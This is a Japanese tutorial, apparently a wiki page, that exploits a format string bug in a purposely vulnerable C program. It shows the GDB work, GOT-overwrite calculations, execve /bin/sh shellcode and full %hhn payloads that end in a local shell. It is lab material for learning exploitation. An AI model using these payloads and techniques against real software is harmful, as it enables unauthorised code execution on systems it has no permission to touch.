<!-- TITLE: Format String Attack -->
<!-- SUBTITLE: A quick summary of Format String Attack -->

# FSBのコード

ももいろテクノロジー様の記事を参考に進めていく[^1]


```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[100];
    printf("[+] buf = %p\n", buf);
    strncpy(buf, argv[1], 100);
    printf(buf);
    putchar('\n');
    return 0;
}
```

# コンパイル

```sh
$ sudo sysctl -a | grep kernel.randomize_va_space
kernel.randomize_va_space = 2
$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
$ gcc -m32 -z execstack fsb.c -o fsb
$ ./fsb $(python -c 'print "AAAA" + ".%08x"*16')
[+] buf = 0xffffd1e8
AAAA.ffffd517.00000064.00f0b5ff.ffffd20e.00000001.000000c2.ffffd304.ffffd20e.ffffd310.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
```

最初の**AAAA**を*0*とすると、*10*番目に**41414141**、すなわちASCIIコードの**AAAA**が表示されている

# GDB

## 調査

まず、`print(buf)`に該当する部分にブレークポイントを貼る
&#8942;

```sh
$ gdb -q ./fsb
⋮
gef➤  disas main
Dump of assembler code for function main:
   0x080484cb <+0>:	lea    ecx,[esp+0x4]
   ⋮
   0x08048518 <+77>:	call   0x80483b0 <strncpy@plt>
   0x0804851d <+82>:	add    esp,0x10
   0x08048520 <+85>:	sub    esp,0xc
   0x08048523 <+88>:	lea    eax,[ebp-0x70]
   0x08048526 <+91>:	push   eax
   0x08048527 <+92>:	call   0x8048370 <printf@plt>
   ⋮
	 0x08048534 <+105>:	call   0x80483a0 <putchar@plt>
   ⋮
   0x08048559 <+142>:	ret    
End of assembler dump.
gef➤  b *main+92
Breakpoint 1 at 0x8048527
```

次に、`<putchar@plt>`のアドレスを逆アセンブルして、GOT tableを除く

```sh
gef➤  disas 0x80483a0
Dump of assembler code for function putchar@plt:
   0x080483a0 <+0>:	jmp    DWORD PTR ds:0x804a018
   0x080483a6 <+6>:	push   0x18
   0x080483ab <+11>:	jmp    0x8048360
End of assembler dump.
```

とりあえず実行して、`0x804a018`を*xinfo*コマンドでアドレスの情報を調べる

```sh
gef➤  r AAAA
⋮
gef➤  xinfo 0x804a018 
──────────────────────────────────────────[ xinfo: 0x804a018 ]──────────────────────────────────────────
Page: 0x0804a000  →  0x0804b000 (size=0x1000)
Permissions: rwx
⋮
```

*Permissions*を見てみると、**w**ビットが立っていることから書き込み可能領域であることがわかる

%hhn指定子を使って1byteずつ処理する予定なので、実行時の引数は

```python
>>> from pwn import *
>>> addr = 0x0804a018
>>> p32(addr) + p32(addr + 1) + p32(addr + 2) + p32(addr + 3)
b'\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08'
```

GDBにこれを引数で渡してやる

```sh
gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08"')
⋮
gef➤  telescope $esp l20
0xffffd130│+0x00: 0xffffd158  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $esp
0xffffd134│+0x04: 0xffffd4ba  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18
0xffffd138│+0x08: 0x00000064 ("d"?)
0xffffd13c│+0x0c: 0x00f0b5ff
0xffffd140│+0x10: 0xffffd17e  →  0x00000000
0xffffd144│+0x14: 0x00000001
0xffffd148│+0x18: 0x000000c2
0xffffd14c│+0x1c: 0xffffd274  →  0xffffd494  →  "/home/mkm/Develop/unix/c_test/got/fsb"
0xffffd150│+0x20: 0xffffd17e  →  0x00000000
0xffffd154│+0x24: 0xffffd280  →  0xffffd4cb  →  "XDG_SEAT=seat0"
0xffffd158│+0x28: 0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $eax
0xffffd15c│+0x2c: 0x0804a019  →  <_GLOBAL_OFFSET_TABLE_+25> add DWORD PTR [eax+ecx*1], 0x0
0xffffd160│+0x30: 0x0804a01a  →  <_GLOBAL_OFFSET_TABLE_+26> add al, 0x8
0xffffd164│+0x34: 0x0804a01b  →  <_GLOBAL_OFFSET_TABLE_+27> or BYTE PTR [eax], al
0xffffd168│+0x38: 0x00000000
0xffffd16c│+0x3c: 0x00000000
0xffffd170│+0x40: 0x00000000
0xffffd174│+0x44: 0x00000000
0xffffd178│+0x48: 0x00000000
0xffffd17c│+0x4c: 0x00000000
```

スタックフレームを見ると、先ほどなぜ*10*番目に**41414141**が位置していたかがわかる（$eax = $esp + 0x28, 0x28 / 4 = 10）

## Shellcodeを入れる位置（オフセット）

[^1] と同様のshellcodeをここでは用いる

```python
shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
```

shellcodeを挿入するとして、どこに入れるといいだろうか？
先ほどの、アドレス引数4つの後にくっつけてGDBで実行してみる

```sh
gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"')
⋮
gef➤  telescope $esp l25
0xffffd110│+0x00: 0xffffd138  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $esp
0xffffd114│+0x04: 0xffffd4a2  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18
0xffffd118│+0x08: 0x00000064 ("d"?)
0xffffd11c│+0x0c: 0x00f0b5ff
0xffffd120│+0x10: 0xffffd15e  →  0x000080cd
0xffffd124│+0x14: 0x00000001
0xffffd128│+0x18: 0x000000c2
0xffffd12c│+0x1c: 0xffffd254  →  0xffffd47c  →  "/home/mkm/Develop/unix/c_test/got/fsb"
0xffffd130│+0x20: 0xffffd15e  →  0x000080cd
0xffffd134│+0x24: 0xffffd260  →  0xffffd4cb  →  "XDG_SEAT=seat0"
0xffffd138│+0x28: 0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $eax
0xffffd13c│+0x2c: 0x0804a019  →  <_GLOBAL_OFFSET_TABLE_+25> add DWORD PTR [eax+ecx*1], 0x0
0xffffd140│+0x30: 0x0804a01a  →  <_GLOBAL_OFFSET_TABLE_+26> add al, 0x8
0xffffd144│+0x34: 0x0804a01b  →  <_GLOBAL_OFFSET_TABLE_+27> or BYTE PTR [eax], al
0xffffd148│+0x38: 0x6852d231
0xffffd14c│+0x3c: 0x68732f2f
0xffffd150│+0x40: 0x69622f68
0xffffd154│+0x44: 0x52e3896e
0xffffd158│+0x48: 0x8de18953
0xffffd15c│+0x4c: 0x80cd0b42
0xffffd160│+0x50: 0x00000000
0xffffd164│+0x54: 0x00000000
0xffffd168│+0x58: 0x00000000
0xffffd16c│+0x5c: 0x00000000
0xffffd170│+0x60: 0x00000000
```

先ほどとは異なり、*0xffffd148*からshellcodeがスタックに積まれている
すなわち、このアドレスに飛ばすようにGOT tableを書き換えればshellが起動するはず
このアドレスと$eax（**\x18\xa0\x04\x08**が最初に書き込まれたアドレス）からのオフセットは、4byteのアドレス4個分なので、4 * 4 = **16**

したがって、飛ばす先は

```sh
gef➤  p $eax + 16
$1 = 0xffffd148
```

little endianなので`\x48\xd1\xff\xff`

# Exploit

さて、今まで書き込んだバイト数は、shellcodeが24byteなので
4 * 4 + 24 = 40 byteになる

```sh
gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"')
⋮
[+] buf = 0xffffd138
⋮
gef➤  telescope $esp l30
0xffffd110│+0x00: 0xffffd138  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $esp
0xffffd114│+0x04: 0xffffd4a2  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18
0xffffd118│+0x08: 0x00000064 ("d"?)
0xffffd11c│+0x0c: 0x00f0b5ff
0xffffd120│+0x10: 0xffffd15e  →  0x000080cd
0xffffd124│+0x14: 0x00000001
0xffffd128│+0x18: 0x000000c2
0xffffd12c│+0x1c: 0xffffd254  →  0xffffd47c  →  "/home/mkm/Develop/unix/c_test/got/fsb"
0xffffd130│+0x20: 0xffffd15e  →  0x000080cd
0xffffd134│+0x24: 0xffffd260  →  0xffffd4cb  →  "XDG_SEAT=seat0"
0xffffd138│+0x28: 0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $eax
0xffffd13c│+0x2c: 0x0804a019  →  <_GLOBAL_OFFSET_TABLE_+25> add DWORD PTR [eax+ecx*1], 0x0
0xffffd140│+0x30: 0x0804a01a  →  <_GLOBAL_OFFSET_TABLE_+26> add al, 0x8
0xffffd144│+0x34: 0x0804a01b  →  <_GLOBAL_OFFSET_TABLE_+27> or BYTE PTR [eax], al
0xffffd148│+0x38: 0x6852d231
0xffffd14c│+0x3c: 0x68732f2f
0xffffd150│+0x40: 0x69622f68
0xffffd154│+0x44: 0x52e3896e
0xffffd158│+0x48: 0x8de18953
0xffffd15c│+0x4c: 0x80cd0b42
0xffffd160│+0x50: 0x00000000
⋮
```

`0xffffd148`に、後ろから1byteずつ%hhnで書き込む
すでに40byte分表示したので

```python
>>> (0x48 - 40) & 0xff
32
>>> (0xd1 - 0x48) & 0xff
137
>>> (0xff - 0xd1) & 0xff
46
```

`\xff`から`\xff`には256byte表示して1周させる


```sh
gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "%32c%10$hhn%137c%11$hhn%46c%12$hhn%256c%13$hhn"')
⋮
[+] buf = 0xffffd108
```

bufの値が変わったので、再調整
$espとshellcode開始アドレスには16byte分のオフセットがあるので、`0xffffd118`がshellcodeのアドレス

```python
>>> (0x18 - 40) & 0xff
240
>>> (0xd1 - 0x18) & 0xff
185
```

残りの2つは先ほどと同じ

```sh
gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "%240c%10$hhn%185c%11$hhn%46c%12$hhn%256c%13$hhn"')
⋮
[+] buf = 0xffffd108
```

今度はbufのアドレスが変わっていない

```sh
gef➤  c
Continuing.
process 24340 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ 
```

Shellが起動した

# スクリプト化しよう


[^1]: [format string attackによるGOT overwriteをやってみる](http://inaz2.hatenablog.com/entry/2014/04/20/041453)